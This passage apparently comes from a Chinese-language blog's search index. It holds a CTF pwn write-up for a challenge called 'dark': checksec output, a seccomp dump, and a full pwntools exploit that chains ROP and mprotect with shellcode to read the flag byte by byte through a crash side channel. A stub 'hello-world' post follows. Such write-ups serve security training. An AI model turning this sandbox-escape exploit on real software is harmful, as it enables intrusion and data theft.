class="line">            main()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            libc.address = <span class="number">0</span></span><br><span class="line">            <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<h1 id="dark"><a href="#dark" class="headerlink" title="dark"></a>dark</h1><h2 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/dajun/binary/shuzijingji/dark/dark&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>很开心</p>
<h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><p>逻辑很简单，一个栈溢出，一个加了保护的沙箱，单纯的逃逸</p>
<p>看一下沙箱允许的系统调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>只允许read，open和mprotect</p>
<h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><ol>
<li>先用mprotect给bss段可执行权限</li>
<li>在bss中构造shellcode</li>
<li>shellcode需要能做到按位进行比对，成功则继续，失败则退出</li>
</ol>
<h2 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h2><p>在前人的基础上改进而来</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./dark'</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_func</span><span class="params">(r12, r13, r14, r15)</span>:</span></span><br><span class="line">    buf = p64(<span class="number">0x401272</span>)</span><br><span class="line">    buf += p64(<span class="number">0</span>) <span class="comment"># rbx</span></span><br><span class="line">    buf += p64(<span class="number">1</span>) <span class="comment"># rbp</span></span><br><span class="line">    buf += p64(r12) <span class="comment"># func name</span></span><br><span class="line">    buf += p64(r13) <span class="comment"># rdx</span></span><br><span class="line">    buf += p64(r14) <span class="comment"># rsi</span></span><br><span class="line">    buf += p64(r15) <span class="comment"># rdi</span></span><br><span class="line">    buf += p64(<span class="number">0x401258</span>)</span><br><span class="line">    buf += <span class="string">'0'</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare big rop chain, because the previous overflow size is not enough for all the</span></span><br><span class="line"><span class="comment"># operations</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(io, offset, cmpval)</span>:</span></span><br><span class="line">    <span class="comment">#io = remote('121.41.41.111', 9999)</span></span><br><span class="line">    bss_addr = <span class="number">0x404100</span></span><br><span class="line">    pop_rbp = <span class="number">0x401149</span></span><br><span class="line">    leave_ret = <span class="number">0x4011ef</span></span><br><span class="line">    b = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">    b += <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss_addr, <span class="number">0x300</span>)</span><br><span class="line">    b += p64(pop_rbp)</span><br><span class="line">    b += p64(bss_addr)</span><br><span class="line">    b += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io, 'b *0x40121E')</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.send(b)</span><br><span class="line">    <span class="comment"># read ROP to it</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    bss_addr2 = <span class="number">0x404500</span></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    b = <span class="string">'''</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    mov rdi, 0x404278</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xchg rax, rdi</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0x404500</span></span><br><span class="line"><span class="string">    mov rdx, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, 0x404500</span></span><br><span class="line"><span class="string">    add rcx, %d</span></span><br><span class="line"><span class="string">    mov al, byte ptr [rcx]</span></span><br><span class="line"><span class="string">    cmp al, %d</span></span><br><span class="line"><span class="string">    jz good</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    bad:</span></span><br><span class="line"><span class="string">    mov rax, 0x40000001</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    good:</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x404700</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp good</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    SC = asm(b % (offset, cmpval))</span><br><span class="line"></span><br><span class="line">    b = p64(<span class="number">0</span>) <span class="comment"># for pop ebp in leave</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'alarm'</span>], <span class="number">1</span>) <span class="comment"># set the elf.got['alarm'] to syscall</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss_addr2, <span class="number">10</span>) <span class="comment"># set rax 10</span></span><br><span class="line">    b += call_func(elf.got[<span class="string">'alarm'</span>], <span class="number">0x404000</span>, <span class="number">0x1000</span>, <span class="number">7</span>) <span class="comment"># mprotect()</span></span><br><span class="line">    b += p64(<span class="number">0x404300</span>)</span><br><span class="line">    b += <span class="string">'flag\x00'</span></span><br><span class="line">    b = b.ljust(<span class="number">0x200</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    b += SC</span><br><span class="line">    io.send(b)</span><br><span class="line">    <span class="comment"># read one byte to the got</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">'\x05'</span>)</span><br><span class="line">    <span class="comment"># read 10 bytes to set the rax</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io.send(<span class="string">'1'</span> * <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">brute</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, starts, end)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.starts = starts</span><br><span class="line">        self.end = end</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> trueflag</span><br><span class="line">        <span class="keyword">global</span> f</span><br><span class="line">        flag = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.starts, self.end):</span><br><span class="line">            <span class="keyword">if</span> f &gt; self.starts:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>, <span class="number">128</span>):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        io = process(binary)</span><br><span class="line">                        main(io, i, j)</span><br><span class="line">                        sleep(<span class="number">2</span>)</span><br><span class="line">                        io.send(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">                        flag.append(chr(j))</span><br><span class="line">                        log.success(flag)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        io.kill()</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        trueflag[self.starts // <span class="number">3</span>] = <span class="string">''</span>.join(flag)</span><br><span class="line">        <span class="keyword">if</span> len(flag) &gt; <span class="number">0</span> <span class="keyword">and</span> flag[<span class="number">-1</span>] == <span class="string">'&#125;'</span>:</span><br><span class="line">            f = self.starts</span><br><span class="line"></span><br><span class="line">f = <span class="number">10000</span></span><br><span class="line">a = datetime.datetime.now()</span><br><span class="line">thread = []</span><br><span class="line">trueflag = list((<span class="string">'\x00'</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    b = brute(i*<span class="number">3</span>, (i+<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    b.start()</span><br><span class="line">    thread.append(b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(trueflag)</span><br><span class="line">b = datetime.datetime.now()</span><br><span class="line">second = (b - a).seconds</span><br><span class="line">minute = second / <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> second, <span class="string">'s'</span></span><br><span class="line"><span class="keyword">print</span> minute, <span class="string">'m'</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>hello-world</title>
    <url>/2019/10/03/hello-world/</url>
    <content><![CDATA[<h3 id="因为琐事买了服务器，从此就在这上面写博客吧……"><a href="#因为琐事买了服务器，从此就在这上面写博客吧……" class="headerlink" title="因为琐事买了服务器，从此就在这上面写博客吧……"></a>因为琐事买了服务器，从此就在这上面写博客吧……</h3>]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
  </entry>
</search>
